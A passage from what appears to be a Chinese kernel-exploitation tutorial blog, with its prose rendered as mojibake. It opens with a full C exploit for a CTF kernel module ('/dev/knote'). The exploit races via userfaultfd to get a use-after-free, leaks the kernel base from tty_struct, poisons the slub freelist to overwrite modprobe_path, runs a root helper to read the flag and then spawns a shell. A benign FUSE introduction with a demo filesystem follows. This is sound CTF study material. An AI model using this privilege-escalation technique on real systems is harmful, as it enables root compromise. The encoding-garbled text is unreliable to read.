msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">size_t</span> size;<br>        <span class="hljs-keyword">size_t</span> index;<br>    &#125;;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Chunk;<br><br><span class="hljs-keyword">long</span> knote_fd;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkAdd</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .size = size,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x1337</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkEdit</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .index = index,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x8888</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkGet</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .index = index,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x2333</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">chunkDel</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> index)</span></span><br><span class="hljs-function"></span>&#123;<br>    Chunk chunk = <br>    &#123;<br>        .index = index,<br>    &#125;;<br>    ioctl(knote_fd, <span class="hljs-number">0x6666</span>, &amp;chunk);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> tty_fd, pid, fd;<br>    <span class="hljs-keyword">size_t</span> modprobe_path, temp[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-keyword">char</span> * buf2, flag[<span class="hljs-number">0x100</span>];<br>    FILE * file = <span class="hljs-literal">NULL</span>;<br><br>    saveStatus();<br>    page_size = sysconf(_SC_PAGE_SIZE);<br>    buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    buf2 = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">strcpy</span>(page, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">// create reverse shell file</span><br>    fd = open(<span class="hljs-string">&quot;/getshell&quot;</span>, O_RDWR | O_CREAT);<br>    write(fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(fd);<br>    system(<span class="hljs-string">&quot;chmod +x /getshell&quot;</span>);<br><br>    <span class="hljs-comment">// register userfaultfd</span><br>    registerUserFaultFd(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br>    registerUserFaultFd(buf2, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    knote_fd = open(<span class="hljs-string">&quot;/dev/knote&quot;</span>, O_RDWR);<br><br>    <span class="hljs-comment">// read saved data(if existed)</span><br>    fd = open(<span class="hljs-string">&quot;kernel_addr.txt&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        close(fd);<br>        file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> (file)<br>        &#123;<br>            <span class="hljs-built_in">fscanf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, &amp;kernel_base, &amp;kernel_offset);<br>            <span class="hljs-keyword">goto</span> exploit;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// leak kernel base from tty struct by reading a free chunk</span><br>    chunkAdd(TTY_STRUCT_SIZE);<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to fork the child&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// child to free the chunk</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process sleeping now...&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process started.&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>        tty_fd = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free and tty got open. Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd...&quot;</span>);<br>        chunkGet(<span class="hljs-number">0</span>, buf);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x58</span>; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data-dump----] %d: %p\n&quot;</span>, i, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(buf) + i));<br><br>    <span class="hljs-keyword">if</span> (*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(buf) + <span class="hljs-number">86</span>))<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Successfully hit the tty_struct.&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    kernel_offset = *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(buf) + <span class="hljs-number">86</span>) - DO_SAK_WORK;<br>    kernel_base = (<span class="hljs-keyword">void</span>*) ((<span class="hljs-keyword">size_t</span>)kernel_base + kernel_offset);<br><br>    file = fopen(<span class="hljs-string">&quot;/kernel_addr.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!file)<br>        errExit(<span class="hljs-string">&quot;Unable to create temp file.&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(file, <span class="hljs-string">&quot;%llx %llx&quot;</span>, kernel_base, kernel_offset);<br>    fclose(file);<br><br>exploit:<br>    modprobe_path = MODPROBE_PATH + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] modprobe_path: %p\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">// hijack the freelist in slub</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(page, &amp;modprobe_path, <span class="hljs-number">8</span>); <span class="hljs-comment">// object-&gt;next</span><br>    <span class="hljs-built_in">memcpy</span>(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(page) + <span class="hljs-number">1</span>), <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to fork the child&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">// child to free the chunk</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process sleeping now...&quot;</span>);<br>        sleep(<span class="hljs-number">2</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Chile process started.&quot;</span>);<br>        chunkDel(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Object free and tty got open. Backing parent thread...&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd...&quot;</span>);<br>        chunkEdit(<span class="hljs-number">0</span>, buf2);<br>    &#125;<br><br>    <span class="hljs-comment">// hijack the modprobe_path</span><br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    chunkAdd(<span class="hljs-number">0x100</span>);<br>    chunkEdit(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;/getshell&quot;</span>);<br><br>    <span class="hljs-comment">// trigger the modprobe_path</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/fake&quot;</span>);<br><br>    <span class="hljs-comment">// get flag</span><br>    sleep(<span class="hljs-number">1</span>);<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to hijack!&quot;</span>);<br>    read(fd, flag, <span class="hljs-number">0x100</span>);<br>    write(<span class="hljs-number">1</span>, flag, <span class="hljs-number">0x100</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— flag</p><p><a href="https://i.loli.net/2021/09/23/xTU3PBlVpAjzytL.png"><img src="https://s2.loli.net/2023/02/06/SI2X5UgNzpHxKLw.png" alt="image.png"></a></p><blockquote><p>ç¬”è€…å°è¯•åå¼¹ä¸€ä¸ª shell åˆ°æœ¬åœ°ç„¶åè¿ä¸Šå»ï¼Œä¸è¿‡å¤±è´¥äº†ï¼ŒåŸå› æš‚ä¸”ä¸æ˜â€¦ï¼ˆç›®å‰æ€€ç–‘å¯èƒ½æ˜¯ qemu ç¯å¢ƒçš„åŸå› </p></blockquote><h2 id="FUSE-race"><a href="#FUSE-race" class="headerlink" title="FUSE race"></a>FUSE race</h2><blockquote><p>FUSE çš„åŸºæœ¬ä¿¡æ¯å‚è€ƒ <a href="https://www.usenix.org/system/files/conference/fast17/fast17-vangoor.pdf">To FUSE or Not to FUSE: Performance of User-Space File Systems</a>ï¼Œä¹Ÿå¯ä»¥å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/143256077">çŸ¥ä¹ä¸Šçš„è¿™ç¯‡æ–‡ç« </a>ï¼ŒåŸºäº FUSE çš„åˆ©ç”¨åˆ™å¯ä»¥å‚è€ƒ<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185</a></p><blockquote><p>æ³¨ï¼šæœ€å¥½å…ˆäº†è§£ VFS ç›¸å…³çš„ä¸€äº›åŸºæœ¬çŸ¥è¯†</p></blockquote></blockquote><h3 id="FUSE-ç®€ä»‹"><a href="#FUSE-ç®€ä»‹" class="headerlink" title="FUSE ç®€ä»‹"></a>FUSE ç®€ä»‹</h3><p>å‰é¢è®²åˆ°ï¼Œè‡ª Linux kernel 5.11 ç‰ˆæœ¬èµ·ï¼Œéç‰¹æƒç”¨æˆ·è¢«ç¦æ­¢ä½¿ç”¨ userfaultfd ç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡ FUSE è¾¾æˆåŒæ ·çš„æ•ˆæœ</strong></p><p>æˆ‘ä»¬å…ˆæ¥ä»‹ç» FUSE â€”â€” <em>Filesystem in Userspace</em> ï¼Œå³<strong>ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼Œè¯¥åŠŸèƒ½<strong>å…è®¸éç‰¹æƒç”¨æˆ·åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼Œå¼€å‘è€…åªéœ€è¦å®ç°å¯¹åº”çš„æ–‡ä»¶æ“ä½œæ¥å£å°±å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ï¼Œè¿™ç»™å¼€å‘è€…æä¾›äº†ç›¸å½“çš„ä¾¿åˆ©</p><p>FUSE è‡ª Linux 2.6.14 ç‰ˆæœ¬å¼•å…¥ï¼Œä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>FUSE å†…æ ¸æ¨¡å—ï¼Œè´Ÿè´£ä¸ kernel çš„ VFS è¿›è¡Œäº¤äº’ï¼Œå¹¶å‘ç”¨æˆ·ç©ºé—´å®ç°çš„æ–‡ä»¶ç³»ç»Ÿè¿›ç¨‹æš´éœ² <code>/dev/fuse</code> å—è®¾å¤‡æ¥å£</li><li><a href="https://github.com/libfuse/libfuse">ç”¨æˆ·ç©ºé—´çš„ libfuse åº“</a> è´Ÿè´£å‘ç”¨æˆ·ç¨‹åºæä¾›å°è£…å¥½çš„æ¥å£ï¼Œå¼€å‘è€…åŸºäºè¯¥åº“è¿›è¡Œç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿçš„å¼€å‘ï¼šç”±ä¸€ä¸ª FUSE daemon å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£ä¸å†…æ ¸æ¨¡å—è¿›è¡Œäº¤äº’å¹¶è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“æ“ä½œ</li></ul><p><a href="https://s2.loli.net/2022/04/06/zDwY7GMZQkE2c9m.png"><img src="https://s2.loli.net/2022/04/06/zDwY7GMZQkE2c9m.png" alt="image.png"></a></p><p>FUSE çš„åŸºæœ¬è¿è¡ŒåŸç†å¦‚ä¸‹ï¼š</p><ul><li>FUSE daemon å®ˆæŠ¤è¿›ç¨‹é€šè¿‡ libfuse åº“çš„ <code>fuse_main()</code> æ³¨å†Œæ–‡ä»¶ç³»ç»Ÿä¸å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œå¹¶æŒ‚è½½åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼ˆä¾‹å¦‚ <code>/mnt/fuse</code>ï¼‰</li><li>ç”¨æˆ·è¿›ç¨‹è®¿é—®æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>/mnt/fuse/file</code>ï¼‰ï¼Œæ¥åˆ°å†…æ ¸ä¸­çš„ VFS å¯¹åº” inode çš„ <code>inode_operations</code> ä¸­çš„å¤„ç†å‡½æ•°ï¼Œäº¤ç”± FUSE å†…æ ¸æ¨¡å—è¿›è¡Œå¤„ç†</li><li>FUSE å†…æ ¸æ¨¡å—å°†è¯·æ±‚è½¬æ¢ä¸ºä¸ç”¨æˆ·æ€ daemon è¿›ç¨‹é—´çº¦å®šçš„æ ¼å¼ï¼Œäº¤ç”±ç”¨æˆ·æ€å¯¹åº”çš„ FUSE daemon å®ˆæŠ¤è¿›ç¨‹è¿›è¡Œå¤„ç†</li><li>åœ¨ FUSE daemon è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºæ—¶æ³¨å†Œçš„å¯¹åº”çš„å¤„ç†å‡½æ•°ï¼Œè¿™ä¸€æ­¥å¯èƒ½ä¼šéœ€è¦è®¿é—®å®é™…çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚ <code>ext4</code>ï¼Œçœ‹æ–‡ä»¶ç³»ç»Ÿå…·ä½“å®šä¹‰ï¼Œä½ ä¹Ÿå¯ä»¥å†™æˆä¸€ä¸ªçº¯å†…å­˜çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆç¬‘ï¼‰ï¼‰</li><li>FUSE daemon å®Œæˆå¤„ç†ï¼Œè¿”å›ç»“æœè‡³ FUSE å†…æ ¸æ¨¡å—ï¼Œå†ç»ç”± VFS è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹</li></ul><p><a href="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png"><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></a></p><p>FUSE å†…éƒ¨è¿˜æœ‰æ›´ä¸ºå¤æ‚çš„ç»“æ„ï¼Œå¦‚äº”ä¸ªå¤„ç†é˜Ÿåˆ—ç­‰ï¼Œä½†è¿™æš‚æ—¶ä¸æ˜¯æˆ‘ä»¬æœ¬ç¯‡éœ€è¦å…³æ³¨çš„ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä½•ç”¨ FUSE æ¥å®Œæˆåˆ©ç”¨å°±è¡Œï¼ˆç¬‘ï¼‰</p><p><a href="https://s2.loli.net/2023/01/10/Mq4UcEBXPTfr7vA.png"><img src="https://s2.loli.net/2023/01/10/Mq4UcEBXPTfr7vA.png" alt="image.png"></a></p><h3 id="FUSE-åŸºæœ¬ç”¨æ³•"><a href="#FUSE-åŸºæœ¬ç”¨æ³•" class="headerlink" title="FUSE åŸºæœ¬ç”¨æ³•"></a>FUSE åŸºæœ¬ç”¨æ³•</h3><p>å€ŸåŠ© libfuse åº“ï¼ŒFUSE çš„ç”¨æ³•å…¶å®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œé¦–å…ˆæ˜¯å®‰è£…åŸºæœ¬çš„ä¾èµ–é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install libfuse2 libfuse-dev</span><br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦è‡ªå®šä¹‰ä¸€å¼  <code>fuse_operations</code> å‡½æ•°è¡¨ï¼Œå¹¶å®ç°å¯¹åº”çš„å‡½æ•°æ¥å£ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶ç³»ç»Ÿè¦å®ç°åˆ›å»ºæ–‡ä»¶å¤¹çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åº”å½“åœ¨å‡½æ•°è¡¨ä¸­å®ç° <code>mkdir()</code> æ¥å£ï¼‰ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œ<strong>å…¶å®éƒ½æ˜¯é€šè¿‡å¯¹è¯¥å‡½æ•°è¡¨ä¸­å®šä¹‰çš„ç›¸åº”å‡½æ•°è¿›è¡Œå›è°ƒå®Œæˆçš„</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">// å¤ªé•¿ï¼Œè¿™é‡Œå°±ä¸æ”¾å®Œäº†</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> &#123;</span><br>    <span class="hljs-keyword">int</span> (*getattr) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, struct stat *);<br>    <span class="hljs-keyword">int</span> (*readlink) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">size_t</span>);<br>    <span class="hljs-keyword">int</span> (*getdir) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">fuse_dirh_t</span>, <span class="hljs-keyword">fuse_dirfil_t</span>);<br>    <span class="hljs-keyword">int</span> (*mknod) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">mode_t</span>, <span class="hljs-keyword">dev_t</span>);<br>    <span class="hljs-keyword">int</span> (*mkdir) (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">mode_t</span>);<br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œç¬”è€…å†™ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿä½œä¸ºç¤ºä¾‹ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å®ç°å¦‚ä¸‹ä¸¤ä¸ªæ¥å£ï¼š</p><ul><li><code>getattr</code> ç”¨ä»¥è·å–æ–‡ä»¶å±æ€§ï¼Œå¯¹äºæ ¹ç›®å½• <code>&quot;/&quot;</code> ï¼ˆç›¸å¯¹äºæŒ‚è½½ç‚¹è€Œè¨€ï¼‰è€Œè¨€æˆ‘ä»¬è¿”å› <code>0755 | S_IFDIR</code> å±æ€§ï¼Œå¦åˆ™è¿”å› <code>0644 | S_IFREG</code> å±æ€§</li><li><code>readdir</code> ç”¨ä»¥éå†ç›®å½•ï¼Œè¿™é‡Œæˆ‘ä»¬ä»…æ”¯æŒéå†æ ¹ç›®å½• <code>&quot;/&quot;</code>ï¼Œè¿”å›ç»“æœæ˜¾ç¤ºåœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>filler()</code> å‡½æ•°å¡«å……å•ä¸ªæ–‡ä»¶ç»“æœ</li></ul><p>ä¹‹åæˆ‘ä»¬ä½¿ç”¨ <code>fuse_main()</code> å°†å…¶æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ä¸‹å³å¯</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">// æ ‡è¯†ä½¿ç”¨çš„ FUSE ç‰ˆæœ¬</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FUSE_USE_VERSION 29</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_readdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, <span class="hljs-keyword">void</span>* buf, <span class="hljs-keyword">fuse_fill_dir_t</span> filler, </span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info* fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        filler(buf, <span class="hljs-string">&quot;a3fuse_test_file&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_getattr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, struct stat *stbuf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_ops</span> =</span> &#123;<br>    .readdir = a3fuse_readdir,<br>    .getattr = a3fuse_getattr,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> fuse_main(argc, argv, &amp;a3fuse_ops, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> gcc a3fuse.c -o a3fuse -D_FILE_OFFSET_BITS=64 -lfuse</span><br></code></pre></div></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><a href="https://s2.loli.net/2023/01/10/SWHjTioDVdtybIv.png"><img src="https://s2.loli.net/2023/01/10/SWHjTioDVdtybIv.png" 